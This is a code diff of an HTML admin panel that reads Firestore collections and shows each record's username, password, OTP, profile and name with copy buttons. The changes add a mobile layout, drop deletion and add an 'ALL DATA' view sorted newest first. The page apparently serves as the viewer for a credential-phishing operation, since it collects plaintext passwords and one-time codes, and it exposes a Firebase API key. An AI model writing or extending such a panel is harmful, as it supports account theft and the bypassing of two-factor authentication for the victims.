@@ -2,7 +2,8 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>Admin Panel - Collection View</title>
+  <title>Admin Panel - Mobile Friendly</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -18,19 +19,22 @@
       margin-bottom: 1rem;
     }
     .top-bar button {
-      padding: 6px 12px;
+      padding: 8px 14px;
       border: none;
       border-radius: 4px;
       cursor: pointer;
       background: #333;
       color: white;
       font-weight: bold;
+      flex-grow: 1;
+      flex-shrink: 0;
     }
     h2 {
-      margin-top: 2rem;
+      margin-top: 1.5rem;
       border-bottom: 2px solid #ccc;
       padding-bottom: 5px;
       color: red;
+      font-size: 1.2rem;
     }
     .entry {
       background: #ffffff;
@@ -48,13 +52,14 @@
     }
     .label {
       font-weight: bold;
+      max-width: 70%;
     }
     .timestamp {
       font-size: 0.8rem;
       color: red;
       margin-top: 3px;
     }
-    .copy-btn, .delete-btn {
+    .copy-btn {
       background: #007bff;
       color: white;
       border: none;
@@ -62,14 +67,20 @@
       padding: 4px 8px;
       cursor: pointer;
       white-space: nowrap;
-      margin-left: auto;
       margin-top: 5px;
-    }
-    .delete-btn {
-      background: #dc3545;
     }
     .section {
       display: none;
+    }
+    @media (max-width: 600px) {
+      .field {
+        flex-direction: column;
+        align-items: flex-start;
+      }
+      .label {
+        max-width: 100%;
+        margin-bottom: 4px;
+      }
     }
   </style>
 </head>
@@ -79,7 +90,7 @@
 
   <script type="module">
     import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
-    import { getFirestore, collection, getDocs, deleteDoc, doc, query } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js";
+    import { getFirestore, collection, getDocs, query } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js";
 
     const firebaseConfig = {
       apiKey: "AIzaSyCPm7u8Gw5IK1GuPVZ02pxr5tXG3ik7xoI",
@@ -119,16 +130,14 @@
       return field;
     }
 
-    function createEntry(entry, colName) {
+    function createEntry(entry) {
       const div = document.createElement("div");
       div.className = "entry";
 
       const displayOrder = ["username", "password", "otp", "profile", "name"];
-
       displayOrder.forEach(key => {
         if (entry.data[key]) {
-          const label = key.charAt(0).toUpperCase() + key.slice(1);
-          const field = createField(label, entry.data[key]);
+          const field = createField(key.charAt(0).toUpperCase() + key.slice(1), entry.data[key]);
           div.appendChild(field);
         }
       });
@@ -159,14 +168,19 @@
           allEntries[col].push({
             id: docSnap.id,
             data: docSnap.data(),
+            collection: col,
           });
         });
-        allEntries[col].sort((a, b) => (b.data.timestamp?.seconds || 0) - (a.data.timestamp?.seconds || 0));
       }
-      createCollectionButtons();
+      createButtons();
     }
 
-    function createCollectionButtons() {
+    function createButtons() {
+      const allBtn = document.createElement("button");
+      allBtn.textContent = "ALL DATA";
+      allBtn.onclick = () => showAllData();
+      buttonsDiv.appendChild(allBtn);
+
       collections.forEach(col => {
         const btn = document.createElement("button");
         btn.textContent = col.replace(/_/g, " ").toUpperCase();
@@ -185,8 +199,31 @@
       heading.textContent = col.toUpperCase();
       section.appendChild(heading);
 
-      allEntries[col].forEach(entry => {
-        const div = createEntry(entry, col);
+      allEntries[col]
+        .sort((a, b) => (b.data.timestamp?.seconds || 0) - (a.data.timestamp?.seconds || 0))
+        .forEach(entry => {
+          const div = createEntry(entry);
+          section.appendChild(div);
+        });
+
+      container.appendChild(section);
+    }
+
+    function showAllData() {
+      container.innerHTML = "";
+      const all = Object.values(allEntries).flat();
+
+      const sorted = all.sort((a, b) => (b.data.timestamp?.seconds || 0) - (a.data.timestamp?.seconds || 0));
+      const section = document.createElement("div");
+      section.className = "section";
+      section.style.display = "block";
+
+      const heading = document.createElement("h2");
+      heading.textContent = "ALL DATA (Newest First)";
+      section.appendChild(heading);
+
+      sorted.forEach(entry => {
+        const div = createEntry(entry);
         section.appendChild(div);
       });
 
